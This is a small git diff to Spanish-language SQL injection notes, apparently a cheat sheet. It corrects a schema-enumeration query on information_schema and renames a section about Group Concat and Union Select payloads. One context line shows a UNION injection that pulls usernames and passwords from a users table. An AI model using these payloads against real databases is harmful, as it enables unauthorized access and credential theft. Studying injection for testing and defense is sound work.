@@ -36,7 +36,7 @@ Es importante tener en cuenta que la disponibilidad y el contenido exacto de la 
 
 ````sql
 ## Schema Name AKA Databases Names Dump
-select schema_name CONCAT information_schema.schemata;
+SELECT schema_name FROM information_schema.schemata;
 ````
 
 ---
@@ -209,7 +209,7 @@ SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table
 
 ---
 
-### 💉 `Group Concat` + `Union Select` + `schema_name`
+### 💉 `Group Concat` + `Union Select` + `TABLE_name`
 
 - `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)
 
